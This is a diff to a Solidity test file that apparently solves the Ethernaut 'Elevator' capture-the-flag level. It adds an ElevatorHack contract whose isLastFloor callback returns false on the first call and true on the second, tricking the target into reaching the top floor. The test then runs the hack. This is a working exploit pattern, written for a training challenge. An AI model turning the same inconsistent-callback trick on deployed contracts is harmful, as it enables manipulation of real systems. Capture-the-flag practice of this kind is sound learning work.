@@ -27,7 +27,8 @@ contract ElevatorTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        ElevatorHack elevatorHack = new ElevatorHack(levelAddress);
+        elevatorHack.hack();
         /*****************
          *Level Submission*
          ***************  */
@@ -36,5 +37,30 @@ contract ElevatorTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract ElevatorHack {
+    Elevator public challenge;
+    uint256 floorUp = 0;
+    // -- 1 --
+    constructor(address challengeAddress) {
+        challenge = Elevator(payable(challengeAddress));
+    }
+
+    function hack() external {
+        // -- 2 --
+        challenge.goTo(1);
+    }
+
+    function isLastFloor(
+        uint256 /* floor */
+    ) external returns (bool) {
+        floorUp++;
+        if (floorUp > 1) {
+            return true;
+        } else {
+            return false;
+        }
     }
 }
